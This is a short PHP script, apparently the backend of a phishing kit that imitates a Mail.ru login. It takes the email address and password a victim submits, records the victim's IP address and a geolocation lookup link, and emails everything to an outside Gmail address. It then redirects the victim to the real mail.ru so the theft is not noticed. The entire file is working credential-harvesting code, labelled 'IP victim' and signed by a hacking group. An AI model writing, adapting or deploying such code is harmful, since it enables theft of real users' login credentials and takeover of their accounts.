<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$password = $_POST['Password'];


$login = "Email : ".$email." ";
$pass = "Password : ".$password;
$target = "IP victim : ".$ip;
$country = "Country : http://www.geoplugin.net/json.gp?ip=".$ip;

$head = "########### Login odagbu ############";
$foot = "####### Indramayu CyBer ###########";
$body = "Mailru |".$ip;
mail("charliefunds@gmail.com", "$body","$head \n\n$login \n$pass \n$target \n$country \n\n$foot");
header("Location: https://mail.ru");
?>